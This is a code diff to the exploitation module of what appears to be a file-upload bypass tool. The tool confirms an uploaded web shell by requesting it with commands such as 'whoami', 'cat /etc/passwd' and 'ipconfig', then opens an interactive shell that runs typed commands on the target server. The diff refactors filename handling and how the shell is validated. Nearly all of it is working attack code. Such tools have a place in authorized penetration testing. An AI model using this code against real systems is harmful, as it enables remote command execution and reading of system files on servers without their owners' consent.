@@ -4,7 +4,7 @@
 
 # Import necessary modules
 import urllib
-from urllib.parse import urljoin
+from urllib.parse import urljoin, unquote
 from .results_output import *
 from . import alerts
 from . import file_upload
@@ -20,12 +20,12 @@ def web_shell(options, headers, file_name, parameter_exists):
                 alerts.warning("To exit interactive shell type exit, to continue the scan CTRL + C")
             else:
                 alerts.warning("To exit interactive shell type exit or press CTRL + C")
-            filename = file_name.decode("ascii")
+            file_name = unquote(file_name)
             partial_url = urljoin(options.url, options.upload_dir)
             if parameter_exists:
-                final_url = f"{partial_url}{filename}&cmd=whoami"
+                final_url = f"{partial_url}{file_name}&cmd=whoami"
             else:
-                final_url = f"{partial_url}{filename}?cmd=whoami" 
+                final_url = f"{partial_url}{file_name}?cmd=whoami" 
             
             response, final_url = file_upload.send_get_request(headers, options, final_url)
             
@@ -36,13 +36,12 @@ def web_shell(options, headers, file_name, parameter_exists):
             else:
                 command = input(f"\n{green}└─$ {reset}")  # User input command to execute on the target machine
 
-            filename = file_name.decode("ascii")
             cmd_encoded = urllib.parse.quote(command)  # Encode the user command
-            partial_url = urljoin(options.url, options.upload_dir)
+            
             if parameter_exists:
-                final_url = f"{partial_url}{filename}&cmd={cmd_encoded}"
+                final_url = f"{partial_url}{file_name}&cmd={cmd_encoded}"
             else:
-                final_url = f"{partial_url}{filename}?cmd={cmd_encoded}"
+                final_url = f"{partial_url}{file_name}?cmd={cmd_encoded}"
 
             # Split the URL to capture the user's command
             user_command = final_url.split("=")
@@ -77,13 +76,14 @@ def web_shell(options, headers, file_name, parameter_exists):
 
 # Function for interactive shell
 def interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension,
-                      current_time, response, user_options, skip_module, exploit_machine = False):
+                      current_time, response, user_options, skip_module, module, exploit_machine = False):
+    
     file_name = file_name.encode("latin-1")
 
     if not isinstance(is_magic_bytes, bool):
         is_magic_bytes = base64.b64encode(is_magic_bytes).decode('latin-1')
 
-    if exploit_machine or options.upload_dir != 'optional' and options.exploitation and not skip_module:
+    if exploit_machine or options.upload_dir != 'optional' and options.exploitation:# and not skip_module:
         parameter_exists = False
         if options.upload_dir.endswith("=/"):
             options.upload_dir = options.upload_dir[:-1]
@@ -95,40 +95,52 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
         results(options.url, file_name, content_type, upload_dir, is_magic_bytes, options.output_dir, allowed_extension,
         current_time)
 
-        filename = file_name.decode("ascii")
+        file_name = file_name.decode("ascii")
+        file_name = unquote(file_name)
+
+        # Removing trailing extension
+        if module in config.original_filenames:
+            split_file_name = file_name.split(".", 1)
+            tmp_file_name = split_file_name[0]
+            file_name = tmp_file_name + "." + options.current_extension_tested
+            
         partial_url = urljoin(options.url, options.upload_dir)
 
         if parameter_exists:
-            final_url = f"{partial_url}{filename}&cmd=cat /etc/passwd"
+            final_url = f"{partial_url}{file_name}&cmd=cat /etc/passwd"
         else:
-            final_url = f"{partial_url}{filename}?cmd=cat /etc/passwd" 
+            final_url = f"{partial_url}{file_name}?cmd=cat /etc/passwd" 
 
         response, final_url = file_upload.send_get_request(headers, options, final_url)
-        # Display # if the shell is accessed with the root user
+
+        # Validating the shell
         if 'root' in response.text:
+            if isinstance(file_name, bytes):
+                file_name = file_name.decode('latin-1')
+
+            file_upload.printing(options, user_options, response, file_name, 100, current_time,
+                                options.current_module, is_magic_bytes, options.current_mimetype) 
+            
             alerts.warning("Interactive shell is activated, you can enter system commands: ")
-        
-        # Display $ if the shell isn't accessed with the root user
+            web_shell(options, headers, file_name, parameter_exists)
+
+        # Validating the shell
         if 'root' not in response.text:
             if parameter_exists:
-                final_url = f"{partial_url}{filename}&cmd=ipconfig"
+                final_url = f"{partial_url}{file_name}&cmd=ipconfig"
             else:
-                final_url = f"{partial_url}{filename}?cmd=ipconfig"
+                final_url = f"{partial_url}{file_name}?cmd=ipconfig"
 
             response, final_url = file_upload.send_get_request(headers, options, final_url)
             if 'Default Gateway' in response.text:
+                if isinstance(file_name, bytes):
+                    file_name = file_name.decode('latin-1')
+                file_upload.printing(options, user_options, response, file_name, 100, current_time,
+                                    options.current_module, is_magic_bytes, options.current_mimetype) 
                 alerts.warning("Interactive shell is activated, you can enter system commands: ")
+                web_shell(options, headers, file_name, parameter_exists)
             else:
                 exploit_machine
-        
-        if not options.brute_force:
-            file_upload.printing(options, user_options, response, file_name.decode('latin-1'), 100, current_time,
-                                 options.current_module, is_magic_bytes, options.current_mimetype)
-            web_shell(options, headers, file_name, parameter_exists)
-            exit(1)
-        else:
-            web_shell(options, headers, file_name, parameter_exists)
-            return exploit_machine
 
     else:
         
@@ -142,9 +154,17 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
             if "?" in options.upload_dir:
                 parameter_exists = True      
 
-            filename = file_name.decode("ascii")
+            file_name = file_name.decode("ascii")
+            file_name = unquote(file_name)
+            
+            # Removing trailing extension
+            if module in config.original_filenames:
+                split_file_name = file_name.split(".", 1)
+                tmp_file_name = split_file_name[0]
+                file_name = tmp_file_name + "." + options.current_extension_tested
+
             partial_url = urljoin(options.url, options.upload_dir)
-            final_url = f"{partial_url}{filename}"
+            final_url = f"{partial_url}{file_name}"
 
             response, final_url = file_upload.send_get_request(headers, options, final_url)
             file_data = open(f"assets/samples/sample.{options.file_extension}", 'r', encoding="latin-1")
@@ -158,10 +178,12 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                     if exploit_answer == "y" or exploit_answer == 'yes':
                         
                         exploit_machine = True
-                        return True
+                        return exploit_machine
 
                     elif exploit_answer == "n" or exploit_answer == 'no': 
                         if not options.brute_force:
+                            if isinstance(file_name, bytes):
+                                file_name = file_name.decode('latin-1')
                             file_upload.printing(options, user_options, response, file_name, 100, current_time, options.current_module,
                                                 is_magic_bytes, options.current_mimetype)
                             # Display upload successful message and location to access the file
@@ -175,22 +197,14 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                     
                     else:
                         info("Choose either y or n!")  
-            else:
-                if isinstance(file_name, bytes):
-                    file_name = file_name.decode('latin-1')
-
-                if not options.brute_force:
-                    file_upload.printing(options, user_options, response, file_name, 100, current_time, options.current_module,
-                                        is_magic_bytes, options.current_mimetype)
-                    exit(1)
-
-                else:
-                    return exploit_machine           
+     
         else:
             if isinstance(file_name, bytes):
                 file_name = file_name.decode('latin-1')
 
             if not options.brute_force:
+                if isinstance(file_name, bytes):
+                    file_name = file_name.decode('latin-1')                
                 file_upload.printing(options, user_options, response, file_name, 100, current_time, options.current_module,
                                     is_magic_bytes, options.current_mimetype)
                 # Display upload successful message and location to access the file
@@ -208,7 +222,7 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
 
 # Function for response checking
 def response_check(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time,
-                   response, user_options, skip_module):
+                   response, user_options, skip_module, module):
     text_or_code = options.text_or_code
     response_status = ""
     exploit_machine = False
@@ -217,7 +231,7 @@ def response_check(options, headers, file_name, content_type, upload_dir, is_mag
         # Check if response is match the status code in message
         if options.text_or_code == response.status_code:  # If status code is equals to the status code of the response
             response_status = "success"
-            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time, response, user_options, skip_module)
+            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time, response, user_options, skip_module, module)
     
         else:
             response_status = "fail"
@@ -227,7 +241,7 @@ def response_check(options, headers, file_name, content_type, upload_dir, is_mag
         # Check if success_message in the response
         if options.upload_message in response.text:  # If success text is present in the response body
             response_status = "success"
-            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time, response, user_options, skip_module)
+            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time, response, user_options, skip_module, module)
 
         else:
             response_status = "fail"
@@ -237,7 +251,7 @@ def response_check(options, headers, file_name, content_type, upload_dir, is_mag
         # Check if failure message not in response
         if options.upload_message not in response.text:  # If success text is present in the response body
             response_status = "success"
-            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time, response, user_options, skip_module)
+            exploit_machine = interactive_shell(options, headers, file_name, content_type, upload_dir, is_magic_bytes, allowed_extension, current_time, response, user_options, skip_module, module)
 
         else:
             response_status = "fail"
